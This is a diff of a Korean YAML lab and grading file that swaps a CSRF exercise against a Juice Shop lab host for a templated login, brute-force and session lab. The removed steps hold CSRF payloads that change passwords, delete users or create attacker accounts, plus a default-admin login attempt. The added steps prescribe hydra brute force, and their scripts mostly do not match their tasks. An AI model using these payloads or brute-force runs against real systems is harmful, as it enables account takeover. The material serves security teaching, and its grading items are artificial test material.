@@ -1,1794 +1,790 @@
-lab_id: web-vuln-ai-week04
-title: CSRF(Cross-Site Request Forgery) 실습 (AI 지원)
-version: ai
-course: web-vuln-ai
+lab_id: standalone-web-vuln-week04
+title: "인증/세션 관리 점검 — 약한 비밀번호 / 인증 우회 / 세션 고정 / 쿠키 속성 (6v6 + R/B/P)"
+version: standalone-non-ai
+course: web-vuln
 week: 4
-description: |
-  CSRF (Cross-Site Request Forgery) 의 원리·PoC·방어를 Juice Shop (http://juice.6v6.lab) 환경에서
-  학습한다. Juice Shop 은 Angular SPA + JWT-in-Header 인증 모델 — 전통적 CSRF (Cookie 자동
-  첨부) 가 자동발동 불가능한 modern stack 이라는 사실 자체가 핵심 학습 결과. 이를 통해
-  Cookie + Session 기반 legacy 시스템 의 CSRF 위협 모델과 modern SPA + JWT 의 차이를
-  명확히 구분한다. 16 step 모두 attacker 컨테이너 (curl/wget/python) 에서 실행하며 stdout
-  을 직접 quote 해야 채점 통과.
+description: 인증 메커니즘과 세션 관리의 취약점을 분석하고 공격과 방어를 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를
+  검증합니다.
 difficulty: medium
 duration_minutes: 120
 objectives:
-- CSRF 의 원리 (피해자 브라우저 + 자동 cookie 첨부) 와 자동발동 조건을 이해한다
-- Juice Shop 의 JWT-Header 인증이 왜 CSRF 면역인지 분석한다 (학습 핵심)
-- CSRF 토큰 / SameSite / Referer / CORS 4 계층 방어를 비교한다
-- legacy Cookie 기반 시스템 의 CSRF PoC (auto-submit form, img src, fetch credentials) 작성
-- 인증방식 × CSRF 방어 매트릭스로 시스템 별 권고를 도출한다
+- 인증 취약점을 탐지한다
+- 세션 관리 취약점을 이해한다
+- 안전한 인증 구현을 학습한다
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: |
-    [목표] Juice Shop (http://juice.6v6.lab) 의 메인 HTML 응답에서 CSRF 토큰 (hidden input,
-    meta tag, JS 변수) 존재 여부를 확인한다.
+  instruction: '{{WEB_IP}} 대상으로 로그인 메커니즘 분석을(를) 수행하시오.
 
-    [배경] CSRF 토큰은 *Cookie + Session* 인증을 쓰는 SSR (Django/Rails/Spring MVC) 에서
-    필수다. 서버가 form 응답에 `<input type="hidden" name="csrf_token" value="...">` 을
-    심어, 다음 POST 에서 token 일치 확인. 외부 사이트는 token 을 알 수 없으니 위조 차단.
 
-    [실행]
-      curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10
-
-    [예상 결과] 빈 출력 (또는 Angular framework 의 hidden input 일부 만). 즉 **CSRF 토큰
-    없음**. Juice Shop = Angular SPA + JWT-Header 인증이라 cookie 가 자동 첨부되지 않는다 →
-    CSRF 가 자동발동 불가능 → 토큰 자체가 불필요한 *modern* 패턴.
-
-    [도구] **curl 단독 의존 금지** — wget / nikto -Tuning x / python BeautifulSoup 도 가능.
-    호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.
-  hint: |
-    grep 결과가 비어 있으면 "CSRF 토큰 없음" 이 정상. 그것이 곧 Juice Shop = JWT-Header
-    의 증거. Cookie 인증 시스템 (DVWA, WordPress 등) 의 form 과 비교해 보면 차이가 명확.
-  category: csrf_detect
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 로그인 메커니즘 분석 관련 도구와 기법을 활용하세요.
+  category: auth
   points: 8
-  answer: |
-    🤖 프롬프트: Juice Shop (http://juice.6v6.lab) 의 메인 페이지에 CSRF 토큰 hidden input
-    이 있는지 확인하고, 결과로부터 인증 모델 (Cookie+Session vs JWT-Header) 을 추정해줘.
-
-    📎 참고 (CLI):
-      curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10 \
-        && echo 'CSRF 토큰 확인 완료'
-  answer_detail: |
-    Juice Shop = Angular SPA + JWT-Header 인증. CSRF 토큰 hidden input 이 없는 것이 정상
-    이며 modern SPA 의 표준 패턴이다. 반면 Django form, Spring MVC, Rails ERB 같은 SSR +
-    Session Cookie 시스템은 csrf_token 필수. 이 step 의 빈 출력은 "취약" 이 아니라 "다른
-    위협 모델" 의 증거임을 학습한다.
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '로그인 메커니즘 분석 완료'"
+  answer_detail: 로그인 메커니즘 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect:
-    - CSRF 토큰 확인 완료
-    - http_request
+    expect: 완료
     field: stdout
     semantic:
-      intent: |
-        Juice Shop HTML 응답에서 CSRF 토큰 (hidden input / meta / JS) 존재 여부 확인. 빈
-        결과 = Angular SPA + JWT-Header 인증의 정상 결과 — 학습 핵심.
+      intent: 로그인 메커니즘 분석 — 로그인 엔드포인트·필드명·응답 코드·세션 쿠키 설정 파악
       success_criteria:
-      - curl 로 메인 페이지 가져와 csrf|_token|hidden grep 실행
-      - 출력 결과 (빈 출력 또는 일부 Angular hidden input) 의 의미 해석
-      - Juice Shop = JWT-Header 라 CSRF 토큰 불필요 사실 명시
-      - SSR + Session Cookie 시스템 (Django/Rails) 과의 차이 언급
+      - curl 로 정상/잘못된 자격증명 시도 후 응답 비교
+      - Set-Cookie 헤더에서 세션 쿠키명과 속성 확인
+      - 응답 본문 또는 상태 코드 차이 (타이밍 차이 포함) 기록
       acceptable_methods:
-      - curl <url> | grep -iE 'csrf|_token|hidden'
-      - wget -qO- + grep
-      - python BeautifulSoup 로 input 분석
-      - browser dev tools DOM 검사
+      - curl -v -d username=test -d password=test <login>
+      - Burp Proxy + Repeater
+      - python requests session 로 쿠키 추적
+      - mitmproxy 로 요청 기록
       negative_signs:
-      - 빈 결과를 "취약" 으로 오판 (실제는 다른 위협 모델)
-      - 인증 모델 (JWT vs Cookie) 추정 누락
-      - SSR 시스템과의 차이 설명 없음
+      - 단일 시도만
+      - 쿠키/응답 분석 없음
+      - 타이밍 차이 언급 없음
   target_vm: attacker
-  script: |
-    curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10
-    echo 'CSRF 토큰 확인 완료'
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '로그인 메커니즘\
+    \ 분석 완료'"
   risk_level: low
-  bastion_prompt: |
-    Juice Shop (http://juice.6v6.lab) 의 메인 페이지에 CSRF 토큰 hidden input 이 있는지
-    확인하고, 결과로부터 인증 모델 (Cookie+Session vs JWT-Header) 을 추정해줘.
+  bastion_prompt: '10.20.32.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘
 
-    실행: curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10
 
-    빈 결과가 정상 (Angular SPA + JWT-Header). 출력 1-3줄 ``` 블록으로 quote 한 뒤,
-    Juice Shop 의 인증 모델 추정과 그 근거 명시. 마지막에 'CSRF 토큰 확인 완료' echo.
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
 - order: 2
-  instruction: |
-    [목표] 가상의 Cookie + Session 사이트 의 패스워드 변경 endpoint 를 위조하는 CSRF PoC
-    HTML 페이지를 작성한다 (legacy 시나리오 시연).
+  instruction: '{{WEB_IP}} 대상으로 브루트포스 공격 시뮬레이션을(를) 수행하시오.
 
-    [배경] 전형적 CSRF = 피해자가 *이미 로그인된* 사이트의 cookie 가 자동 첨부되는 점을 악용.
-    공격자 페이지가 hidden form 을 자동 submit → 피해자의 cookie 가 함께 전송되어 서버는
-    정상 요청으로 인식.
 
-    [Juice Shop 적용성] Juice Shop 자체는 JWT-Header 라 PoC 가 *작동 안 함* — 그러나 PoC
-    의 *구조* 자체는 Cookie 기반 시스템 (DVWA, WordPress wp-admin, 기업 내 form-based
-    web) 에 그대로 적용 가능. 작동 여부 확인 보다 *PoC 구조 이해* 가 목표.
-
-    [실행]
-      cat > /tmp/csrf_poc.html <<'HTML'
-      <html><body onload="document.forms[0].submit()">
-        <form action="http://juice.6v6.lab/profile" method="POST">
-          <input type="hidden" name="password" value="hacked123">
-        </form>
-      </body></html>
-      HTML
-      head -c 200 /tmp/csrf_poc.html && echo
-      echo 'CSRF PoC 작성 완료'
-
-    [도구 권장] curl + cookie jar (-b -c), HTML form 작성, browser 로 PoC 페이지 직접 로드
-    가능. 호출 후 **stdout 1~3줄을 ``` 블록으로 직접 quote**.
-  hint: |
-    onload 자동 submit + hidden input 으로 새 비밀번호 지정 + form action 에 대상 URL.
-    legacy Cookie 시스템 가정. Juice Shop 의 JWT-Header 에서는 안 작동.
-  category: csrf_craft
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 브루트포스 공격 시뮬레이션 관련 도구와 기법을 활용하세요.
+  category: auth
   points: 10
-  answer: |
-    🤖 프롬프트: 가상 Cookie 기반 사이트 (예: WordPress) 의 패스워드 변경 endpoint 를 위조
-    하는 auto-submit CSRF PoC HTML 을 /tmp/csrf_poc.html 로 작성하고, Juice Shop 에서는
-    왜 작동하지 않는지 설명해줘.
-
-    📎 참고 (CLI):
-      cat > /tmp/csrf_poc.html <<'HTML'
-      <html><body onload="document.forms[0].submit()">
-        <form action="http://juice.6v6.lab/profile" method="POST">
-          <input type="hidden" name="password" value="hacked123">
-        </form>
-      </body></html>
-      HTML
-      head -c 200 /tmp/csrf_poc.html && echo
-      echo 'CSRF PoC 작성 완료'
-  answer_detail: |
-    auto-submit form 은 피해자가 페이지를 *열기만 하면* 즉시 POST 가 발생하는 핵심 CSRF
-    벡터. 단 이 공격은 (1) 피해자가 *대상 사이트에 로그인 중* + (2) 인증이 *cookie + SameSite
-    완화* + (3) form action 의 endpoint 가 *Origin/Referer 검증 없음* — 3 조건이 모두 성립
-    해야 작동. Juice Shop 은 (1) 만 있고 (2)(3) 가 차단 — JWT-Header 인증이라 cookie 자동
-    첨부 자체가 없다.
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '브루트포스 공격\
+    \ 시뮬레이션 완료'"
+  answer_detail: 브루트포스 공격 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect: CSRF PoC 작성 완료
+    expect: 완료
     field: stdout
     semantic:
-      intent: |
-        auto-submit CSRF PoC HTML 작성 — form action + hidden input + body onload submit.
-        Legacy Cookie 시스템 가정. Juice Shop 의 JWT-Header 에선 작동 안 함 사실 명시.
+      intent: 브루트포스 시뮬레이션 — 계정 잠금·Rate Limit 검증 (hydra/medusa 또는 수동 반복)
       success_criteria:
-      - /tmp/csrf_poc.html 파일 생성 + head 출력 quote
-      - form action 에 대상 URL + method=POST 포함
-      - hidden input 으로 변경할 값 (new password) 지정
-      - body onload 자동 submit 또는 iframe src 자동 실행 메커니즘 명시
-      - Juice Shop 의 JWT-Header 에서 작동 안 하는 이유 (cookie 자동첨부 부재) 한 줄 명시
+      - 최소 10회 반복 시도 후 응답 코드·본문 변화
+      - Rate Limiting 또는 계정 잠금 여부 판정
+      - 429 또는 Retry-After 헤더 해석
       acceptable_methods:
-      - HTML form body onload submit
-      - iframe srcdoc 로 내장
-      - JavaScript fetch POST + credentials include
-      - BeEF module 활용
+      - hydra -l <user> -P wordlist.txt <url>
+      - for i in 1..20; do curl ...; done
+      - Burp Intruder sniper 모드
+      - medusa -h <host> -U users.txt -P passes.txt
       negative_signs:
-      - form action URL 누락
-      - 자동 submit 미설정 (사용자 클릭 필요)
-      - JWT-Header 에서 안 작동 한다는 사실 누락
-      - PoC 작동 전제 (cookie+session) 조건 분석 없음
+      - 단일 시도로 판정
+      - Rate Limit 해석 없음
+      - 429/계정 잠금 언급 없음
   target_vm: attacker
-  script: |
-    cat > /tmp/csrf_poc.html <<'HTML'
-    <html><body onload="document.forms[0].submit()">
-      <form action="http://juice.6v6.lab/profile" method="POST">
-        <input type="hidden" name="password" value="hacked123">
-      </form>
-    </body></html>
-    HTML
-    head -c 200 /tmp/csrf_poc.html && echo
-    echo 'CSRF PoC 작성 완료'
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '브루트포스 공격\
+    \ 시뮬레이션 완료'"
   risk_level: low
-  bastion_prompt: |
-    Legacy Cookie 기반 시스템 가정한 패스워드 변경 위조 auto-submit CSRF PoC HTML 을
-    /tmp/csrf_poc.html 로 작성. 다음 헤레닥 명령 실행 후 head 결과 quote:
+  bastion_prompt: '10.20.32.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘
 
-      cat > /tmp/csrf_poc.html <<'HTML'
-      <html><body onload="document.forms[0].submit()">
-        <form action="http://juice.6v6.lab/profile" method="POST">
-          <input type="hidden" name="password" value="hacked123">
-        </form>
-      </body></html>
-      HTML
-      head -c 200 /tmp/csrf_poc.html && echo
-      echo 'CSRF PoC 작성 완료'
 
-    마지막에 Juice Shop 의 JWT-Header 에서는 왜 작동 안 하는지 한 문장 설명.
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
 - order: 3
-  instruction: |
-    [목표] `<img src>` 태그를 이용한 GET 기반 CSRF PoC 를 작성하고, RESTful 원칙 위반과의
-    관계를 분석한다.
+  instruction: '{{WEB_IP}} 대상으로 패스워드 정책 검증을(를) 수행하시오.
 
-    [배경] 브라우저는 `<img src="...">` 의 URL 을 자동 GET 한다. 만약 서버가 GET 메서드로
-    *상태 변경* (계정 삭제, 송금 등) 을 허용한다면, 단순한 이미지 태그만으로 피해자 cookie
-    가 자동 첨부된 GET 요청이 발생 → CSRF 성립.
 
-    [근본 원인] RFC 7231 §4.2.1: GET 은 *safe* (서버 상태 변경 금지). 이 원칙을 위반한 API
-    설계 (예: `/api/users/1/delete` GET) 가 곧 CSRF 공격면.
-
-    [실행]
-      cat > /tmp/csrf_get.html <<'HTML'
-      <html><body>
-        <h1>Cute kitten gallery</h1>
-        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
-      </body></html>
-      HTML
-      head -c 300 /tmp/csrf_get.html && echo
-      echo 'GET CSRF PoC 작성 완료'
-
-    [도구 권장] curl + cookie jar, HTML form 작성, browser 로 페이지 로드. 호출 후
-    **stdout 1~3줄 ``` 블록 quote**.
-  hint: |
-    img src 에 상태 변경 URL 삽입. RESTful 원칙 (GET = safe) 위반 분석 포함. 다른 벡터:
-    `<link rel=prefetch>`, `<script src>`, CSS `background-image: url(...)`.
-  category: csrf_craft
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 패스워드 정책 검증 관련 도구와 기법을 활용하세요.
+  category: auth
   points: 10
-  answer: |
-    🤖 프롬프트: img 태그를 이용한 GET 기반 CSRF PoC HTML 을 /tmp/csrf_get.html 로 작성
-    하고, GET 메서드로 상태 변경을 허용한 설계가 왜 위험한지 RFC 7231 관점에서 설명해줘.
-
-    📎 참고 (CLI):
-      cat > /tmp/csrf_get.html <<'HTML'
-      <html><body>
-        <h1>Cute kitten gallery</h1>
-        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
-      </body></html>
-      HTML
-      head -c 300 /tmp/csrf_get.html && echo
-      echo 'GET CSRF PoC 작성 완료'
-  answer_detail: |
-    GET = safe method (RFC 7231) — 상태 변경 금지가 원칙. 위반 시 (1) img 태그 한 줄로
-    CSRF 가능 (2) 브라우저 history / 프록시 / 로그에 민감 작업 노출 (3) prefetch / link
-    rel 등 다양한 자동 GET 벡터에 노출. 대응: 상태 변경은 항상 POST/PUT/DELETE + CSRF
-    토큰 + Origin 검증.
-  verify:
-    type: output_contains
-    expect: GET CSRF PoC 작성 완료
-    field: stdout
-    semantic:
-      intent: |
-        GET 기반 CSRF PoC — img src 에 상태 변경 URL. 페이지 로드만으로 자동 GET 발생.
-        RFC 7231 GET-safe 원칙 위반과의 관계 분석.
-      success_criteria:
-      - /tmp/csrf_get.html 생성 + head 출력 quote
-      - img src 에 GET 상태변경 URL (예 /api/Users/1?_method=DELETE) 포함
-      - 페이지 방문만으로 요청 발생 메커니즘 설명
-      - RFC 7231 GET=safe 원칙과 위반 시 위험성 명시
-      acceptable_methods:
-      - img src <target url>
-      - link rel=prefetch
-      - iframe src
-      - CSS background-image:url(...)
-      - script src
-      negative_signs:
-      - POST 메서드로 오해
-      - GET-safe 원칙 언급 없음
-      - 자동 GET 벡터 단일 (img 만)
-  target_vm: attacker
-  script: |
-    cat > /tmp/csrf_get.html <<'HTML'
-    <html><body>
-      <h1>Cute kitten gallery</h1>
-      <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
-    </body></html>
-    HTML
-    head -c 300 /tmp/csrf_get.html && echo
-    echo 'GET CSRF PoC 작성 완료'
-  risk_level: low
-  bastion_prompt: |
-    GET 기반 CSRF PoC HTML 을 /tmp/csrf_get.html 로 작성. 다음 헤레닥 실행 후 head 출력
-    quote:
-
-      cat > /tmp/csrf_get.html <<'HTML'
-      <html><body>
-        <h1>Cute kitten gallery</h1>
-        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
-      </body></html>
-      HTML
-      head -c 300 /tmp/csrf_get.html && echo
-      echo 'GET CSRF PoC 작성 완료'
-
-    마지막에 RFC 7231 GET-safe 원칙과 위반 시 위험성 한 문장 설명.
-- order: 4
-  instruction: |
-    [목표] fetch API 의 `credentials: 'include'` 옵션으로 cross-origin 인증 요청을 위조하는
-    AJAX CSRF PoC 를 작성하고, CORS preflight 와의 상호작용을 분석한다.
-
-    [배경] fetch 기본값 = `credentials: 'same-origin'` (cookie 첨부 X). `'include'` 명시
-    시 cookie + Authorization 모두 첨부. 단 Content-Type 이 application/json 이면 *simple
-    request 가 아닌 preflight* 요청이 발생 → 서버가 OPTIONS 응답으로 허용한 origin 만 통과.
-
-    [세 가지 케이스]
-      1. simple request (Content-Type: text/plain) + credentials:include → preflight 없음
-      2. JSON request + credentials:include → preflight 발생 → 서버 거부 시 차단
-      3. CORS 와일드카드 + credentials:include → 브라우저가 차단 (스펙 위반)
-
-    [실행]
-      cat > /tmp/csrf_ajax.js <<'JS'
-      fetch('http://juice.6v6.lab/api/Users', {
-        method: 'POST',
-        credentials: 'include',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({email: 'evil@attacker.com', password: 'pwned'})
-      }).then(r => r.text()).then(console.log);
-      JS
-      cat /tmp/csrf_ajax.js && echo 'AJAX CSRF 작성 완료'
-
-    [도구 권장] fetch / XHR / axios 또는 curl + cookie jar 로 모방. 호출 후 stdout 1~3줄
-    quote.
-  hint: |
-    credentials:include 가 핵심. Content-Type 에 따라 preflight 발생 여부 달라짐. Juice
-    Shop 처럼 Authorization 헤더 인증은 credentials 와 무관 (Authorization 은 fetch 옵션
-    headers 에 명시적으로 넣어야 첨부됨).
-  category: csrf_craft
-  points: 10
-  answer: |
-    🤖 프롬프트: fetch API + credentials:include 로 cross-origin CSRF 시도하는 PoC JS 를
-    /tmp/csrf_ajax.js 로 작성하고, simple request vs preflight 차이 + Juice Shop 의 JWT
-    Authorization 헤더가 이 공격에 영향 받지 않는 이유 설명해줘.
-
-    📎 참고 (CLI):
-      cat > /tmp/csrf_ajax.js <<'JS'
-      fetch('http://juice.6v6.lab/api/Users', {
-        method: 'POST',
-        credentials: 'include',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({email: 'evil@attacker.com', password: 'pwned'})
-      }).then(r => r.text()).then(console.log);
-      JS
-      cat /tmp/csrf_ajax.js && echo 'AJAX CSRF 작성 완료'
-  answer_detail: |
-    credentials:include 는 *cookie 와 HTTP 인증* 을 자동 첨부하지만 *Authorization 헤더*
-    는 fetch 옵션 headers 에 명시적으로 넣어야 한다. 따라서 Juice Shop 처럼 localStorage
-    의 JWT 를 클라이언트 JS 가 Authorization 헤더에 채워 보내는 경우, 공격자 페이지의 fetch
-    는 그 JWT 에 접근 불가 (다른 origin 의 localStorage 는 same-origin policy 차단) →
-    CSRF 자동발동 불가. 이는 *JWT-Header 모델이 CSRF 면역*인 핵심 메커니즘.
-  verify:
-    type: output_contains
-    expect: AJAX CSRF 작성 완료
-    field: stdout
-    semantic:
-      intent: |
-        fetch + credentials:include 의 CSRF PoC + simple vs preflight 차이 + Juice Shop
-        Authorization 헤더 영향 분석.
-      success_criteria:
-      - /tmp/csrf_ajax.js 작성 + cat 출력 quote
-      - fetch({method, credentials:'include', body}) 구조 포함
-      - simple request 와 preflight 요청 의 구분 (Content-Type 기준) 설명
-      - Juice Shop 의 Authorization 헤더가 credentials 와 무관함 명시
-      acceptable_methods:
-      - fetch credentials:include
-      - XMLHttpRequest withCredentials=true
-      - axios withCredentials 설정
-      - JSONP 악용 (구형)
-      negative_signs:
-      - credentials 설정 누락
-      - simple vs preflight 구분 없음
-      - Authorization 헤더 처리 (Same-Origin Policy) 언급 없음
-  target_vm: attacker
-  script: |
-    cat > /tmp/csrf_ajax.js <<'JS'
-    fetch('http://juice.6v6.lab/api/Users', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email: 'evil@attacker.com', password: 'pwned'})
-    }).then(r => r.text()).then(console.log);
-    JS
-    cat /tmp/csrf_ajax.js && echo 'AJAX CSRF 작성 완료'
-  risk_level: low
-  bastion_prompt: |
-    fetch API + credentials:include 의 CSRF PoC JS 를 /tmp/csrf_ajax.js 로 작성.
-
-      cat > /tmp/csrf_ajax.js <<'JS'
-      fetch('http://juice.6v6.lab/api/Users', {
-        method: 'POST',
-        credentials: 'include',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({email: 'evil@attacker.com', password: 'pwned'})
-      }).then(r => r.text()).then(console.log);
-      JS
-      cat /tmp/csrf_ajax.js && echo 'AJAX CSRF 작성 완료'
-
-    출력 quote + (1) simple vs preflight 구분 (2) Juice Shop 의 Authorization 헤더가 왜
-    영향 안 받는지 한 문장 명시.
-- order: 5
-  instruction: |
-    [목표] Juice Shop 의 응답 헤더에서 Set-Cookie 와 SameSite 속성을 확인하고, SameSite
-    Strict/Lax/None 의 CSRF 방어 효과를 비교한다.
-
-    [배경] SameSite 쿠키 속성 (RFC 6265bis):
-      - **Strict** : 모든 cross-site 요청에서 cookie 전송 차단 (top-level navigation 도 포함)
-      - **Lax** (Chrome 80+ 기본값, 2020.02~): top-level GET 만 허용, POST/PUT/iframe 차단
-      - **None** (+ Secure 필수): cross-site cookie 허용 — 기존 3rd-party 동작 유지
-
-    [실행]
-      curl -sI http://juice.6v6.lab | grep -iE 'set-cookie|cookie'
-      echo '---'
-      # login 응답에서도 Set-Cookie 확인
-      curl -s -i -X POST -H 'Content-Type: application/json' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
-        http://juice.6v6.lab/rest/user/login | grep -iE 'set-cookie|cookie'
-      echo '---'
-      echo 'SameSite 분석 완료'
-
-    [예상 결과] Set-Cookie 헤더 자체가 없음 → Juice Shop = JWT 를 HTTP body 로 응답 +
-    클라이언트 localStorage 저장 → cookie 미사용 → SameSite 정책 적용 불가능. 학습 포인트:
-    SameSite 는 *cookie 기반 인증* 의 방어 메커니즘이며 modern SPA + JWT-Header 에는 적용
-    불가.
-
-    [도구 권장] curl -i 또는 -I, browser DevTools Application 탭, OWASP ZAP. 호출 후 stdout
-    1~3줄 quote.
-  hint: |
-    grep 결과가 비어 있으면 Juice Shop 은 cookie 자체를 안 쓰는 것. JWT 가 어디 저장되는지
-    (localStorage / sessionStorage / Cookie) 도 같이 분석. SameSite 3 단계 차이는 항상 설명.
-  category: csrf_defense
-  points: 10
-  answer: |
-    🤖 프롬프트: Juice Shop 의 응답 헤더에서 Set-Cookie/SameSite 확인하고, JWT 저장 위치
-    (localStorage vs Cookie) 와 SameSite 정책의 적용 가능성을 분석해줘.
-
-    📎 참고 (CLI):
-      curl -sI http://juice.6v6.lab | grep -iE 'set-cookie|cookie'
-      echo '---'
-      curl -s -i -X POST -H 'Content-Type: application/json' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
-        http://juice.6v6.lab/rest/user/login | grep -iE 'set-cookie|cookie'
-      echo '---'
-      echo 'SameSite 분석 완료'
-  answer_detail: |
-    SameSite Strict = cross-site 모두 차단 (cookie 미전송) / Lax = top-level GET 허용 +
-    POST/iframe 차단 / None = 전부 허용 (Secure 필수). Chrome 2020.02 이후 미지정 시 Lax
-    기본 → 대부분 CSRF 자동 차단. 단 GET 으로 상태변경하는 API 는 Lax 로도 보호 안 됨.
-    Juice Shop = JWT in localStorage 라 cookie 자체 미사용 → SameSite 적용 불가능. 이
-    경우 방어는 CORS + Origin 검증 + 짧은 JWT exp + RefreshToken Rotation 으로 이전.
-  verify:
-    type: output_contains
-    expect: SameSite 분석 완료
-    field: stdout
-    semantic:
-      intent: |
-        Juice Shop Set-Cookie 부재 확인 + SameSite 3단계 비교 + JWT-localStorage 라 SameSite
-        적용 불가능 사실 + 대안 방어 (CORS+Origin+짧은 exp) 학습.
-      success_criteria:
-      - curl -sI / login POST 둘 다 실행해 Set-Cookie 헤더 부재 확인
-      - SameSite Strict/Lax/None 3단계 차이 설명
-      - Lax 의 top-level GET 예외 + Chrome 2020.02 Lax 기본값 언급
-      - Juice Shop = JWT in localStorage → cookie 미사용 → SameSite 적용 불가 명시
-      - cookie 미사용 시 대안 방어 (CORS/Origin/짧은 JWT exp/RefreshToken) 언급
-      acceptable_methods:
-      - curl -sI 또는 -i 로 응답 헤더 확인
-      - browser DevTools Application 탭 cookie/storage 확인
-      - Chrome Cookie Policy 문서
-      - OWASP Session Management Cheat Sheet
-      negative_signs:
-      - 3단계 중 일부만 설명
-      - JWT 저장 위치 분석 누락
-      - 대안 방어 (cookie 없는 경우) 누락
-  target_vm: attacker
-  script: |
-    curl -sI http://juice.6v6.lab | grep -iE 'set-cookie|cookie' || echo '(메인 응답 Set-Cookie 없음)'
-    echo '---'
-    curl -s -i -X POST -H 'Content-Type: application/json' \
-      -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
-      http://juice.6v6.lab/rest/user/login | grep -iE 'set-cookie|cookie' || echo '(login 응답 Set-Cookie 없음)'
-    echo '---'
-    echo 'SameSite 분석 완료'
-  risk_level: low
-  bastion_prompt: |
-    Juice Shop 의 Set-Cookie/SameSite 확인:
-
-      curl -sI http://juice.6v6.lab | grep -iE 'set-cookie|cookie' || echo '(메인 응답 Set-Cookie 없음)'
-      echo '---'
-      curl -s -i -X POST -H 'Content-Type: application/json' \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
-        http://juice.6v6.lab/rest/user/login | grep -iE 'set-cookie|cookie' || echo '(login 응답 Set-Cookie 없음)'
-      echo '---'
-      echo 'SameSite 분석 완료'
-
-    출력 quote + SameSite 3단계 차이 (Strict/Lax/None) + Juice Shop = JWT-localStorage
-    라 cookie 미사용 / SameSite 적용 불가능 사실 명시.
-- order: 6
-  instruction: |
-    [목표] CSRF 토큰 검증 로직의 흔한 구현 결함 6 가지를 분류하고, 각각의 우회 PoC 와 올바른
-    방어 패턴을 정리한다.
-
-    [결함 카탈로그]
-      1. **토큰 미검증** : 서버가 token 파라미터를 받지만 비교 안 함
-      2. **빈 토큰 허용** : `if (token != null)` 만 검사, 빈 문자열 통과
-      3. **GET 예외** : POST 만 검증하고 GET 의 상태변경은 통과
-      4. **전역 토큰** : 세션 무관 단일 토큰 — 한 번 유출되면 평생
-      5. **약한 entropy** : Math.random / timestamp 기반 → 추측 가능
-      6. **referer-fallback** : 토큰 없을 때 Referer 검증으로 회피 — 둘 다 우회 가능
-
-    [실행 (가상 시나리오 분류 출력)]
-      cat <<'REPORT'
-      === CSRF 토큰 검증 약점 카탈로그 ===
-      1. 토큰 미검증              | 우회: token=anything       | 방어: HMAC-SHA256 비교
-      2. 빈 토큰 허용             | 우회: token=               | 방어: 빈 문자열/null reject
-      3. GET 메서드 예외          | 우회: GET 으로 변경 API 호출 | 방어: GET = safe 원칙
-      4. 전역 토큰 (세션 무관)    | 우회: 다른 사용자 토큰 재사용 | 방어: session bound
-      5. 약한 entropy (rand/time) | 우회: 토큰 예측             | 방어: CSPRNG 32 byte
-      6. Referer fallback         | 우회: Referer 도 위조       | 방어: 다층 검증 + 토큰 필수
-      === CSRF 토큰 분석 완료 ===
-      REPORT
-
